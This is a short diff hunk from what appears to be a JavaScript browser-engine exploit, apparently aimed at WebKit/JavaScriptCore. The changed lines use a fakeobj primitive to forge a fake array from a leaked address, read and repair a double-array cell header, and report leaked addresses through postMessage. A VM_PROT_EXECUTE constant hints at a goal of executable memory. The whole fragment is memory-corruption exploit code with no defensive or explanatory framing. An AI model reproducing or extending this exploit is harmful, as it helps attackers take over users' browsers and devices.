@@ -493,9 +493,9 @@ var VM_PROT_EXECUTE = 0x4
             port.postMessage("obj @ " + addr.toString());
             port.postMessage(typeof(addr) +"vs"+typeof(0x10))
            
-            let fakeArr = fakeobj(Add(addr,new Int64(0x10))); //no way around this im forced to use bigint for fakeobj :(
+            let fakeArr = fakeobj(Add(addr,0x10)); //no way around this im forced to use bigint for fakeobj :(
             // subtract off the incref
-            doubleArrayCellHeader = Sub(Int64.fromDouble(fakeArr[0]),new Int64(0x1));
+            doubleArrayCellHeader = Sub(Int64.fromDouble(fakeArr[0]),0x1);
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
             // fix broken cell header
             fakeArr[0] = new Int64(doubleArrayCellHeader).asDouble();
